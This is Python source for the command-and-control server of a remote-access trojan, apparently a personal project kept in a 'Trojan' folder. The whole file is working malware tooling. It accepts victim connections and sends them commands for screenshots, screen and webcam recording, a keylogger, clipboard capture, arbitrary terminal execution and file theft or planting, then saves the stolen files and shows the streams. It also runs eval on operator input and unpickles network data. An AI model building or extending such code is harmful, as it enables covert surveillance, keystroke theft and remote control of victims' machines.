problems = r"""
1. LiveStreaming doesn't work (Screen and WebCam)
"""

import os
import json
import pickle
import cv2
from socket import socket, AF_INET, SOCK_STREAM, gethostbyname, gethostname
from threading import Thread
import time


class Server:
    def __init__(self):
        if not os.path.exists('Clients'): os.mkdir('Clients')
        self.getConstants()
        self.header = self.constants['headerSize']
        self.address = (self.constants["server"], self.constants["port"])
        self.format = self.constants['format']
        self.buffer = self.constants['bufferSize']
        self.options = [
            "ScreenShot",
            "ScreenRecording",
            "WebCamRecording",
            "SystemInformation",
            "KeyLogger",
            "ClipBoardCopying",
            "ExecuteInTerminal",
            "GetFile",
            "SendFile",
            "MailFile",
            "Quit"
        ]
        # Thread(target=self.initializeServer).start()
        self.initializeServer()

    def getConstants(self):
        with open(r'C:\Ishaan\Programming\Python\Trojan\Constants.json') as file:
            data = json.load(file)
        self.constants = data["FTP"]
        # self.constants = {
        #     "disconnectMessage": "!DISCONNECT",
        #     "headerSize": 16,
        #     "server": gethostbyname(gethostname()),
        #     "port": 5050,
        #     "format": "utf-8",
        #     "bufferSize": 64
        # }
    
    def initializeServer(self):
        self.server = socket(AF_INET, SOCK_STREAM)
        self.server.bind(self.address)
        self.server.listen()
        self.clients = {}
        self.debug = True
        if self.debug: print(f'[LISTENING]: server is listening on {self.constants["server"]}')
        while True:
            client, address = self.server.accept()
            Thread(target=self.recieve, args=(client, address)).start()
            Thread(target=self.takeCommand).start()

    def send(self, client, msgType, message):
        message = pickle.dumps((msgType, message))
        header = f"{len(message):<{self.header}}".encode(self.format)
        try: client.send(header + message)
        except: pass

    # def chooseAction(self):
    #     for i in range(len(self.options)):
    #         print(i+1, self.options[i])
    #     while True:
    #         choice = input('>>>\t')
    #         if not choice: continue
    #         try:
    #             choice = int(choice)
    #             choice = self.options[choice-1]
    #             print(choice)
    #             return choice
    #         except: print('Error')

    # def chooseTarget(self):
    #     while True:
    #         try: targetList = [(key, value) for key, value in self.clients.items()]
    #         except RuntimeError: continue
    #         except: pass
    #         else: break
    #     if len(targetList) == 0:
    #         # print('No Target Available')
    #         return None
    #     elif len(targetList) == 1:
    #         return (targetList[0][1][0],)
    #     else:
    #         for index, item in enumerate(targetList): print(f'\t{index}.\t{item[0]}\t\t(<{index}>)')
    #         while True:
    #             try:
    #                 choice = input('>>>\t').strip().split()
    #                 choice = [i.lstrip('<').rstrip('>') for i in choice]
    #                 choice = [targetList.get(i)[1][0] for i in choice]
    #                 choice = [i[1][0] for i in choice if i]
    #                 return choice
    #             except: print('Error')

    # def takeCommand(self):
    #     while True:
    #         if not self.clients: continue
    #         targets = self.chooseTarget()
    #         if not targets: continue
    #         action = self.chooseAction()
    #         params = None
    #         msgType = 'COMMAND'

    #         if action == 'Quit':
    #             for target in targets: self.send(target, 'UPDATE', self.constants['disconnectMessage'])
            
    #         elif action in ('ScreenShot', 'SystemInformation'):
    #             for target in targets:
    #                 self.send(target, 'COMMAND', action)
            
    #         else:
    #             if action in ('ScreenRecording', 'WebCamRecording', 'ClipBoardCopying'):
    #                 while True:
    #                     try: duration = int(input(f'Please Enter the duration for {action} in seconds\t'))
    #                     except: continue
    #                     else: break
    #                 params = (duration,)
                
    #             if action in ('ScreenRecording', 'WebCamRecording'):
    #                 while True:
    #                     try: isLive = bool(int(input('Do you want Live Feed?, Press 1 for Yes and 0 for No\t')))
    #                     except: continue
    #                     else: break
    #                 params = (params[0], isLive)
                
    #             if action == 'WebCamRecording':
    #                 while True:
    #                     try: source = int(input('Please enter the source number for WebCamRecording\t'))
    #                     except: continue
    #                     else: break
    #                 params = (params[0], source, params[1])
                
    #             if action == 'ClipBoardCopying':
    #                 params = params[0]
                
    #             elif action == 'KeyLogger':
    #                 while True:
    #                     try: running = bool(int(input('Do you want to turn KeyLogger on or off, Press 1 for On and 0 for Off\t')))
    #                     except: continue
    #                     else: break
    #                 params = running

    #             elif action == 'ExecuteInTerminal':
    #                 command = ''
    #                 while not command: command = input('Command >>>\t')
    #                 params = command
                
    #             elif action in ('SendFile', 'MailFile'):
    #                 fileName = input('What do you want the file to be named?\t')
    #                 while not fileName: fileName = input('What do you want the file to be named?\t')
                    
    #                 path = input('The path of the file you wish to send is:\t')
    #                 while not os.path.exists(path):
    #                     print('The path does not exist')
    #                     path = input('The path of the file you wish to send is:\t')
                    
    #                 params = (fileName, path)
                
                
    #             if action == 'GetFile':
    #                 fileName = input('What do you want the file to be named in Target Machine?\t')
    #                 while not fileName: fileName = input('What do you want the file to be named in Target Machine?\t')
                    
    #                 path = input('The path of the file you wish to save to in Target Machine is:\t')
    #                 while not path: path = input('The path of the file you wish to save to in Target Machine is:\t')
                    
    #                 filePath = input('The path of the file you wish to send is:\t')
    #                 while not os.path.exists(filePath):
    #                     print('The path does not exist')
    #                     filePath = input('The path of the file you wish to send is:\t')
                    
    #                 with open(filePath, 'rb') as file:
    #                     data = file.read()

    #                 msgType = 'FILE'
    #                 params = (fileName, path, data)

    #             for target in targets: self.send(target, msgType, (action, params))


    # def takeCommand(self):
    #     while True:
    #         try:
    #             command = input('>>> ')
    #             if command:
    #                 command = command.split('>>')
    #                 client = self.clients[command[0]][0]
    #                 command[1] = eval(command[1])

    #                 if command[1] == 0: self.send(client, 'COMMAND', ('ScreenRecording', (10, False)))
    #                 elif command[1] == 1: self.send(client, 'COMMAND', ('WebCamRecording', (10, 0, False)))
    #                 else: self.send(client, 'COMMAND', command[1])
    #         except:
    #             continue

    def takeCommand(self):
        while True:
            args = {
                'duration': 5,
                'liveStream': False,
                'webCamSource': 0,
                'runKeyLogger': False,
                'command': '',
                'fileName': 'fileName.ext',
                'pathOfFile': '',
                'filePath': ''
            }
            command = input('>>> ')
            if not command: continue
            try:
                if '--target' not in command:
                    print('No Target in command')
                    continue
                if '--action' not in command:
                    print('No action in command')
                    continue

                command = [i.strip() for i in command.split('--') if i.strip()]
                for i in command:
                    i = i.split()
                    value = ' '.join(i[1:])
                    key = i[0]
                    if key in ('duration', 'liveStream', 'webcamSource', 'runKeyLogger'):
                        value = eval(value)
                    args[key] = value

                self.sendCommand(args)

            except: pass

    def sendCommand(self, args):
        if not self.clients:
            print('The Server is NOT taking commands as it does not have any clients')
            return

        target = self.clients.get(args['target'])
        if not target:
            print('requested Client NOT available')
            return
        target = target[0]

        action = args['action']
        if action not in self.options:
            print('requested Action NOT available')
            return None

        try:
            if action == 'Quit':
                return self.send(target, 'UPDATE', self.constants['disconnectMessage'])

            elif action in ('ScreenShot', 'SystemInformation'):
                return self.send(target, 'COMMAND', action)

            elif action == 'ScreenRecording':
                if not args['duration']: return None
                return self.send(target, 'COMMAND', (action, (args['duration'], args['liveStream'])))
            
            elif action == 'WebCamRecording':
                if not args['duration']: return None
                return self.send(target, 'COMMAND', (action, (args['duration'], args['webCamSource'], args['liveStream'])))
            
            elif action == 'ClipBoardCopying':
                if not args['duration']: return None
                return self.send(target, 'COMMAND', (action, args['duration']))
            
            elif action == 'KeyLogger':
                return self.send(target, 'COMMAND', (action, args['runKeyLogger']))

            elif action == 'ExecuteInTerminal':
                if not args['command']: return None
                return self.send(target, 'COMMAND', (action, args['command']))
            
            elif action in ('SendFile', 'MailFile'):
                if (not args['pathOfFile']) and args['filePath']:
                    args['filePath'], args['pathOfFile'] = args['pathOfFile'], args['filePath']
                return self.send(target, 'COMMAND', (action, (args['fileName'], args['pathOfFile'])))
            
            elif action == 'GetFile':
                if not os.path.exists(args['filePath']):
                    print('The path does not exist')
                    return None
                
                with open(args['filePath'], 'rb') as file:
                    data = file.read()

                self.send(target, 'FILE', (action, (args['fileName'], args['pathOfFile'], data)))
        except: pass


    def recieve(self, client, address):
        print(f'[CONNECTION]:\t{address} connected')
        while True:
            try:
                try:
                    temp = client.recv(self.header)
                    temp = temp.decode(self.format)
                    msgLength = int(temp)
                except: continue
                if not msgLength: continue

                message = b''
                while msgLength > self.buffer:
                    message += client.recv(self.buffer)
                    msgLength -= self.buffer
                message += client.recv(msgLength)
                msgType, message = pickle.loads(message)

                if msgType == 'UPDATE' and message == self.constants['disconnectMessage']:
                    for name in self.clients.keys():
                        if self.clients[name][0] == client:
                            removedName = name
                            break
                    del self.clients[removedName]
                    print(f'Client {removedName}{address} DISCONNECTED')
                    client.close()
                    break

                self.handleClient(client, address, msgType, message)
            except (ConnectionResetError, OSError): break
            except: continue

    def handleClient(self, client, address, msgType, message):
        # print(msgType)
        if msgType == 'NAME':
            name = input(f'The name for {address} is:\n(Leave Blank for {message})')
            name = name if name else message
            self.clients.update({name: (client, address)})
        
        elif msgType == 'PING':
            self.send(client, 'PING', message)
            # print('PING')
        
        elif msgType == 'FILE':
            fileName, data = message
            path = os.path.join(os.getcwd(), 'Clients')
            if not os.path.exists(path): os.mkdir('Clients')
            path = os.path.join(path, fileName)
            counter = 0
            while os.path.exists(path):
                counter += 1
                path = path.split('.')
                path = '.'.join(path[:-1]) + f'({counter}).' + path[-1]
            with open(path, 'wb') as file:
                file.write(data)
            if self.debug: print(fileName, 'recieved')
            
        elif msgType == 'STREAM':
            cv2.imshow('stream', message)
            if cv2.waitKey(0) & 0xFF == ord('q'):
                cv2.destroyAllWindows()
                return
        
        elif msgType == 'UPDATE' and message == 'EndOfStream': cv2.destroyAllWindows()
        
        elif msgType in ('OUTPUT', 'ERROR', 'UPDATE'):
            print("="*20, f'{msgType}:\n{message}', "="*20, sep='\n')

        else:
            print(f'[{msgType}]', message, sep='\t')

if __name__ == '__main__': s = Server()
